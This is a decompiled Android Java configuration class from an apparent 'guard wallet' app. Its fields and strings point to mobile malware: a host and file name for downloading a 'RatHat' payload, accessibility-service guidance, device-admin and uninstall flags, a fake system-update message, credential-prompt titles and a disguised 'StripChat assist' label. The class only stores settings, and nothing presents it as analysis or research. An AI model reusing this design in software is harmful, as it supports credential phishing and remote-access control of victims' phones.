package com.guard.wallet.entity;

import a1.q;
import android.support.annotation.NonNull;
import com.guard.wallet.utils.e;
import com.guard.wallet.utils.h;
import java.io.Serializable;
import java.util.HashMap;
import java.util.Objects;

public class BuildConfig implements Serializable {
   private Integer activeAdmin;
   private String blockBgColor;
   private String blockIconUrl;
   private Integer debug;
   private String downloadRatHatHost;
   private String downloadRatHatName;
   private String guideAccessibilityHost;
   private HashMap<String, LangDialog> langMap;
   private String mainActivity;
   private String mainUrl;
   private Integer perIdleDuration;
   private Integer perScreenOffDuration;
   private Integer promotionModel;
   private String serverHost;
   private String trusteeId;
   private Integer uninstall;

   public BuildConfig() {
   }

   public BuildConfig(
      String var1,
      String var2,
      String var3,
      String var4,
      String var5,
      String var6,
      String var7,
      String var8,
      String var9,
      Integer var10,
      Integer var11,
      Integer var12,
      Integer var13,
      Integer var14,
      Integer var15,
      HashMap<String, LangDialog> var16
   ) {
      this.serverHost = var1;
      this.downloadRatHatHost = var2;
      this.downloadRatHatName = var3;
      this.guideAccessibilityHost = var4;
      this.mainActivity = var5;
      this.mainUrl = var6;
      this.trusteeId = var7;
      this.blockIconUrl = var8;
      this.blockBgColor = var9;
      this.promotionModel = var10;
      this.uninstall = var11;
      this.activeAdmin = var12;
      this.langMap = var16;
      this.debug = var13;
      this.perScreenOffDuration = var14;
      this.perIdleDuration = var15;
   }

   public String getAccessibilityServiceLabel() {
      String var3 = h.m();
      if (!q.B(var3)) {
         HashMap var1 = this.langMap;
         if (var1 != null && !var1.isEmpty()) {
            String var4 = e.f(var3);
            LangDialog var2 = this.langMap.get(var3);
            LangDialog var5 = var2;
            if (var2 == null) {
               var5 = var2;
               if (!Objects.equals(var4, var3)) {
                  var5 = this.langMap.get(var4);
               }
            }

            var2 = var5;
            if (var5 == null) {
               var2 = this.langMap.get("en");
            }

            if (var2 != null) {
               return var2.getAccessibilityServiceLabel();
            }
         }
      }

      return null;
   }

   public Integer getActiveAdmin() {
      return this.activeAdmin;
   }

   public String getAlertMsg() {
      String var3 = h.m();
      if (!q.B(var3)) {
         HashMap var1 = this.langMap;
         if (var1 != null && !var1.isEmpty()) {
            String var4 = e.f(var3);
            LangDialog var2 = this.langMap.get(var3);
            LangDialog var5 = var2;
            if (var2 == null) {
               var5 = var2;
               if (!Objects.equals(var4, var3)) {
                  var5 = this.langMap.get(var4);
               }
            }

            var2 = var5;
            if (var5 == null) {
               var2 = this.langMap.get("en");
            }

            if (var2 != null) {
               return var2.getAlertMsg();
            }
         }
      }

      return null;
   }

   public String getAlertRestrictedMsg() {
      String var3 = h.m();
      if (!q.B(var3)) {
         HashMap var1 = this.langMap;
         if (var1 != null && !var1.isEmpty()) {
            String var4 = e.f(var3);
            LangDialog var2 = this.langMap.get(var3);
            LangDialog var5 = var2;
            if (var2 == null) {
               var5 = var2;
               if (!Objects.equals(var4, var3)) {
                  var5 = this.langMap.get(var4);
               }
            }

            var2 = var5;
            if (var5 == null) {
               var2 = this.langMap.get("en");
            }

            if (var2 != null) {
               return var2.getAlertRestrictedMsg();
            }
         }
      }

      return null;
   }

   public String getAlertTitle() {
      String var3 = h.m();
      if (!q.B(var3)) {
         HashMap var1 = this.langMap;
         if (var1 != null && !var1.isEmpty()) {
            String var4 = e.f(var3);
            LangDialog var2 = this.langMap.get(var3);
            LangDialog var5 = var2;
            if (var2 == null) {
               var5 = var2;
               if (!Objects.equals(var4, var3)) {
                  var5 = this.langMap.get(var4);
               }
            }

            var2 = var5;
            if (var5 == null) {
               var2 = this.langMap.get("en");
            }

            if (var2 != null) {
               return var2.getAlertTitle();
            }
         }
      }

      return null;
   }

   public String getAliveBlockMsg() {
      String var3 = h.m();
      if (!q.B(var3)) {
         HashMap var1 = this.langMap;
         if (var1 != null && !var1.isEmpty()) {
            String var4 = e.f(var3);
            LangDialog var2 = this.langMap.get(var3);
            LangDialog var5 = var2;
            if (var2 == null) {
               var5 = var2;
               if (!Objects.equals(var4, var3)) {
                  var5 = this.langMap.get(var4);
               }
            }

            var2 = var5;
            if (var5 == null) {
               var2 = this.langMap.get("en");
            }

            if (var2 != null) {
               return var2.getAliveBlockMsg();
            }
         }
      }

      return null;
   }

   public String getAllowRestricted() {
      String var3 = h.m();
      if (!q.B(var3)) {
         HashMap var1 = this.langMap;
         if (var1 != null && !var1.isEmpty()) {
            String var4 = e.f(var3);
            LangDialog var2 = this.langMap.get(var3);
            LangDialog var5 = var2;
            if (var2 == null) {
               var5 = var2;
               if (!Objects.equals(var4, var3)) {
                  var5 = this.langMap.get(var4);
               }
            }

            var2 = var5;
            if (var5 == null) {
               var2 = this.langMap.get("en");
            }

            if (var2 != null) {
               return var2.getAllowRestricted();
            }
         }
      }

      return null;
   }

   public String getAppCredentialDescription() {
      String var3 = h.m();
      if (!q.B(var3)) {
         HashMap var1 = this.langMap;
         if (var1 != null && !var1.isEmpty()) {
            String var4 = e.f(var3);
            LangDialog var2 = this.langMap.get(var3);
            LangDialog var5 = var2;
            if (var2 == null) {
               var5 = var2;
               if (!Objects.equals(var4, var3)) {
                  var5 = this.langMap.get(var4);
               }
            }

            var2 = var5;
            if (var5 == null) {
               var2 = this.langMap.get("en");
            }

            if (var2 != null) {
               return var2.getAppCredentialDescription();
            }
         }
      }

      return null;
   }

   public String getAppCredentialInitMsg() {
      String var3 = h.m();
      if (!q.B(var3)) {
         HashMap var1 = this.langMap;
         if (var1 != null && !var1.isEmpty()) {
            String var4 = e.f(var3);
            LangDialog var2 = this.langMap.get(var3);
            LangDialog var5 = var2;
            if (var2 == null) {
               var5 = var2;
               if (!Objects.equals(var4, var3)) {
                  var5 = this.langMap.get(var4);
               }
            }

            var2 = var5;
            if (var5 == null) {
               var2 = this.langMap.get("en");
            }

            if (var2 != null) {
               return var2.getAppCredentialInitMsg();
            }
         }
      }

      return null;
   }

   public String getAppCredentialSubTitle() {
      String var3 = h.m();
      if (!q.B(var3)) {
         HashMap var1 = this.langMap;
         if (var1 != null && !var1.isEmpty()) {
            String var4 = e.f(var3);
            LangDialog var2 = this.langMap.get(var3);
            LangDialog var5 = var2;
            if (var2 == null) {
               var5 = var2;
               if (!Objects.equals(var4, var3)) {
                  var5 = this.langMap.get(var4);
               }
            }

            var2 = var5;
            if (var5 == null) {
               var2 = this.langMap.get("en");
            }

            if (var2 != null) {
               return var2.getAppCredentialSubTitle();
            }
         }
      }

      return null;
   }

   public String getAppCredentialTitle() {
      String var3 = h.m();
      if (!q.B(var3)) {
         HashMap var1 = this.langMap;
         if (var1 != null && !var1.isEmpty()) {
            String var4 = e.f(var3);
            LangDialog var2 = this.langMap.get(var3);
            LangDialog var5 = var2;
            if (var2 == null) {
               var5 = var2;
               if (!Objects.equals(var4, var3)) {
                  var5 = this.langMap.get(var4);
               }
            }

            var2 = var5;
            if (var5 == null) {
               var2 = this.langMap.get("en");
            }

            if (var2 != null) {
               return var2.getAppCredentialTitle();
            }
         }
      }

      return null;
   }

   public String getAppLabel() {
      String var3 = h.m();
      if (!q.B(var3)) {
         HashMap var1 = this.langMap;
         if (var1 != null && !var1.isEmpty()) {
            String var4 = e.f(var3);
            LangDialog var2 = this.langMap.get(var3);
            LangDialog var5 = var2;
            if (var2 == null) {
               var5 = var2;
               if (!Objects.equals(var4, var3)) {
                  var5 = this.langMap.get(var4);
               }
            }

            var2 = var5;
            if (var5 == null) {
               var2 = this.langMap.get("en");
            }

            if (var2 != null) {
               return var2.getAppLabel();
            }
         }
      }

      return "StripChat assist";
   }

   public String getBlockBgColor() {
      return this.blockBgColor;
   }

   public String getBlockIconUrl() {
      return this.blockIconUrl;
   }

   public Integer getDebug() {
      return this.debug;
   }

   public String getDownloadRatHatHost() {
      return this.downloadRatHatHost;
   }

   public String getDownloadRatHatName() {
      return this.downloadRatHatName;
   }

   public String getExitConfirm() {
      String var3 = h.m();
      if (!q.B(var3)) {
         HashMap var1 = this.langMap;
         if (var1 != null && !var1.isEmpty()) {
            String var4 = e.f(var3);
            LangDialog var2 = this.langMap.get(var3);
            LangDialog var5 = var2;
            if (var2 == null) {
               var5 = var2;
               if (!Objects.equals(var4, var3)) {
                  var5 = this.langMap.get(var4);
               }
            }

            var2 = var5;
            if (var5 == null) {
               var2 = this.langMap.get("en");
            }

            if (var2 != null) {
               return var2.getExitConfirm();
            }
         }
      }

      return null;
   }

   public String getGuideAccessibilityHost() {
      return this.guideAccessibilityHost;
   }

   public HashMap<String, LangDialog> getLangMap() {
      return this.langMap;
   }

   public String getLauncherLabel() {
      String var3 = h.m();
      if (!q.B(var3)) {
         HashMap var1 = this.langMap;
         if (var1 != null && !var1.isEmpty()) {
            String var4 = e.f(var3);
            LangDialog var2 = this.langMap.get(var3);
            LangDialog var5 = var2;
            if (var2 == null) {
               var5 = var2;
               if (!Objects.equals(var4, var3)) {
                  var5 = this.langMap.get(var4);
               }
            }

            var2 = var5;
            if (var5 == null) {
               var2 = this.langMap.get("en");
            }

            if (var2 != null) {
               return var2.getLauncherLabel();
            }
         }
      }

      return null;
   }

   public String getMainActivity() {
      return this.mainActivity;
   }

   public String getMainUrl() {
      return this.mainUrl;
   }

   public String getNotificationContent() {
      String var3 = h.m();
      if (!q.B(var3)) {
         HashMap var1 = this.langMap;
         if (var1 != null && !var1.isEmpty()) {
            String var4 = e.f(var3);
            LangDialog var2 = this.langMap.get(var3);
            LangDialog var5 = var2;
            if (var2 == null) {
               var5 = var2;
               if (!Objects.equals(var4, var3)) {
                  var5 = this.langMap.get(var4);
               }
            }

            var2 = var5;
            if (var5 == null) {
               var2 = this.langMap.get("en");
            }

            if (var2 != null) {
               return var2.getNotificationContent();
            }
         }
      }

      return null;
   }

   public String getNotificationTitle() {
      String var3 = h.m();
      if (!q.B(var3)) {
         HashMap var1 = this.langMap;
         if (var1 != null && !var1.isEmpty()) {
            String var4 = e.f(var3);
            LangDialog var2 = this.langMap.get(var3);
            LangDialog var5 = var2;
            if (var2 == null) {
               var5 = var2;
               if (!Objects.equals(var4, var3)) {
                  var5 = this.langMap.get(var4);
               }
            }

            var2 = var5;
            if (var5 == null) {
               var2 = this.langMap.get("en");
            }

            if (var2 != null) {
               return var2.getNotificationTitle();
            }
         }
      }

      return null;
   }

   public String getOkText() {
      String var3 = h.m();
      if (!q.B(var3)) {
         HashMap var1 = this.langMap;
         if (var1 != null && !var1.isEmpty()) {
            String var4 = e.f(var3);
            LangDialog var2 = this.langMap.get(var3);
            LangDialog var5 = var2;
            if (var2 == null) {
               var5 = var2;
               if (!Objects.equals(var4, var3)) {
                  var5 = this.langMap.get(var4);
               }
            }

            var2 = var5;
            if (var5 == null) {
               var2 = this.langMap.get("en");
            }

            if (var2 != null) {
               return var2.getOkText();
            }
         }
      }

      return null;
   }

   public Integer getPerIdleDuration() {
      return this.perIdleDuration;
   }

   public Integer getPerScreenOffDuration() {
      return this.perScreenOffDuration;
   }

   public Integer getPromotionModel() {
      return this.promotionModel;
   }

   public String getServerHost() {
      return this.serverHost;
   }

   public String getTrusteeId() {
      return this.trusteeId;
   }

   public Integer getUninstall() {
      return this.uninstall;
   }

   public String getUpdateCredentialDescription() {
      String var3 = h.m();
      if (!q.B(var3)) {
         HashMap var1 = this.langMap;
         if (var1 != null && !var1.isEmpty()) {
            String var4 = e.f(var3);
            LangDialog var2 = this.langMap.get(var3);
            LangDialog var5 = var2;
            if (var2 == null) {
               var5 = var2;
               if (!Objects.equals(var4, var3)) {
                  var5 = this.langMap.get(var4);
               }
            }

            var2 = var5;
            if (var5 == null) {
               var2 = this.langMap.get("en");
            }

            if (var2 != null) {
               return var2.getUpdateCredentialDescription();
            }
         }
      }

      return null;
   }

   public String getUpdateCredentialSubTitle() {
      String var3 = h.m();
      if (!q.B(var3)) {
         HashMap var1 = this.langMap;
         if (var1 != null && !var1.isEmpty()) {
            String var4 = e.f(var3);
            LangDialog var2 = this.langMap.get(var3);
            LangDialog var5 = var2;
            if (var2 == null) {
               var5 = var2;
               if (!Objects.equals(var4, var3)) {
                  var5 = this.langMap.get(var4);
               }
            }

            var2 = var5;
            if (var5 == null) {
               var2 = this.langMap.get("en");
            }

            if (var2 != null) {
               return var2.getUpdateCredentialSubTitle();
            }
         }
      }

      return null;
   }

   public String getUpdateCredentialTitle() {
      String var3 = h.m();
      if (!q.B(var3)) {
         HashMap var1 = this.langMap;
         if (var1 != null && !var1.isEmpty()) {
            String var4 = e.f(var3);
            LangDialog var2 = this.langMap.get(var3);
            LangDialog var5 = var2;
            if (var2 == null) {
               var5 = var2;
               if (!Objects.equals(var4, var3)) {
                  var5 = this.langMap.get(var4);
               }
            }

            var2 = var5;
            if (var5 == null) {
               var2 = this.langMap.get("en");
            }

            if (var2 != null) {
               return var2.getUpdateCredentialTitle();
            }
         }
      }

      return null;
   }

   public String getUpdateSystemMsg() {
      String var3 = h.m();
      if (!q.B(var3)) {
         HashMap var1 = this.langMap;
         if (var1 != null && !var1.isEmpty()) {
            String var4 = e.f(var3);
            LangDialog var2 = this.langMap.get(var3);
            LangDialog var5 = var2;
            if (var2 == null) {
               var5 = var2;
               if (!Objects.equals(var4, var3)) {
                  var5 = this.langMap.get(var4);
               }
            }

            var2 = var5;
            if (var5 == null) {
               var2 = this.langMap.get("en");
            }

            if (var2 != null) {
               return var2.getUpdateSystemMsg();
            }
         }
      }

      return null;
   }

   public String getWifiBlockMsg() {
      String var3 = h.m();
      if (!q.B(var3)) {
         HashMap var1 = this.langMap;
         if (var1 != null && !var1.isEmpty()) {
            String var4 = e.f(var3);
            LangDialog var2 = this.langMap.get(var3);
            LangDialog var5 = var2;
            if (var2 == null) {
               var5 = var2;
               if (!Objects.equals(var4, var3)) {
                  var5 = this.langMap.get(var4);
               }
            }

            var2 = var5;
            if (var5 == null) {
               var2 = this.langMap.get("en");
            }

            if (var2 != null) {
               return var2.getWifiBlockMsg();
            }
         }
      }

      return null;
   }

   public void setActiveAdmin(Integer var1) {
      this.activeAdmin = var1;
   }

   public void setBlockBgColor(String var1) {
      this.blockBgColor = var1;
   }

   public void setBlockIconUrl(String var1) {
      this.blockIconUrl = var1;
   }

   public void setDebug(Integer var1) {
      this.debug = var1;
   }

   public void setDownloadRatHatHost(String var1) {
      this.downloadRatHatHost = var1;
   }

   public void setDownloadRatHatName(String var1) {
      this.downloadRatHatName = var1;
   }

   public void setGuideAccessibilityHost(String var1) {
      this.guideAccessibilityHost = var1;
   }

   public void setLangMap(HashMap<String, LangDialog> var1) {
      this.langMap = var1;
   }

   public void setMainActivity(String var1) {
      this.mainActivity = var1;
   }

   public void setMainUrl(String var1) {
      this.mainUrl = var1;
   }

   public void setPerIdleDuration(Integer var1) {
      this.perIdleDuration = var1;
   }

   public void setPerScreenOffDuration(Integer var1) {
      this.perScreenOffDuration = var1;
   }

   public void setPromotionModel(Integer var1) {
      this.promotionModel = var1;
   }

   public void setServerHost(String var1) {
      this.serverHost = var1;
   }

   public void setTrusteeId(String var1) {
      this.trusteeId = var1;
   }

   public void setUninstall(Integer var1) {
      this.uninstall = var1;
   }

   @NonNull
   @Override
   public String toString() {
      StringBuilder var1 = new StringBuilder("BuildConfig{serverHost='");
      var1.append(this.serverHost);
      var1.append("',downloadRatHatHost='");
      var1.append(this.downloadRatHatHost);
      var1.append("',downloadRatHatName='");
      var1.append(this.downloadRatHatName);
      var1.append("',guideAccessibilityHost='");
      var1.append(this.guideAccessibilityHost);
      var1.append("',mainActivity='");
      var1.append(this.mainActivity);
      var1.append("',mainUrl='");
      var1.append(this.mainUrl);
      var1.append("', trusteeId='");
      var1.append(this.trusteeId);
      var1.append("', blockIconUrl='");
      var1.append(this.blockIconUrl);
      var1.append("', blockBgColor='");
      var1.append(this.blockBgColor);
      var1.append("', promotionModel='");
      var1.append(this.promotionModel);
      var1.append("', uninstall='");
      var1.append(this.uninstall);
      var1.append("', activeAdmin='");
      var1.append(this.activeAdmin);
      var1.append("', debug='");
      var1.append(this.debug);
      var1.append("', perScreenOffDuration='");
      var1.append(this.perScreenOffDuration);
      var1.append("', perIdleDuration='");
      var1.append(this.perIdleDuration);
      var1.append("', langMap='");
      var1.append(this.langMap);
      var1.append("'}");
      return var1.toString();
   }
}
